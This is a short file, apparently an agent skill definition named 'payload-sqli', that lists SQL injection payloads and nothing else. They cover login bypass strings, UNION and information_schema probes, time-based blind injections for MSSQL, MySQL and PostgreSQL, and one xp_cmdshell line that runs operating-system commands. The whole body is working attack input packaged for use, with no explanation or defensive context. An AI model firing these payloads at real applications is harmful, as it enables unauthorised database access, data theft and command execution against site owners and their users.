---
name: payload-sqli
when_to_use: 需要 SQLi payload
---
# SQLi
## Basic
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT NULL--
## Advanced
' UNION SELECT 1,2,3,4,5--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--
'; EXEC xp_cmdshell('whoami')--
' OR 1=1 LIMIT 1--
## Time-based
'; WAITFOR DELAY '00:00:05'--   (MSSQL)
' OR (SELECT SLEEP(5))--        (MySQL)
'; SELECT pg_sleep(5)--         (PostgreSQL)
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
